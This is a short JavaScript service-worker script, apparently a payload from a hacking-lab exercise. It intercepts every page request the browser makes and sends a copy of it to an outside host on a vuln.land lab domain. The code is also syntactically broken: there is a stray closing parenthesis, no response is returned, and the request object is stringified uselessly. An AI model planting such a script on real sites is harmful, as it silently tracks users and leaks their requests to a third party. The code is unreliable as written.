self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
	  fetch('http://888f69e5-7431-4c41-a3ef-b0e538d33c4b.idocker.vuln.land/robots.txt?b='+e.request)
  });
  );
});
